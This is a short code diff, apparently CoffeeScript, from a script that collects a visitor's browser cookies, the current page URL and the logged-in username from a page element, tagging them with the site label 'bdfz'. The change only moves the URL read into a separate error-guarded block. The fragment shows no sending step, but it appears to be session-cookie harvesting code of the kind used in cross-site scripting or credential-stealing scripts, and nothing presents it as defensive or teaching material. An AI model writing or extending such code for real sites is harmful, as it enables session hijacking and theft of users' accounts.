@@ -4,11 +4,15 @@
 try
   data = 
     cookie   : document.cookie
-    url      : window.location.href
     site     : 'bdfz'
 catch error
   data = 
     error    : error
+
+try
+  data.url = window.location.href
+catch e
+  ;
 
 try
   data.username = document.getElementById("LblUserName").innerHTML
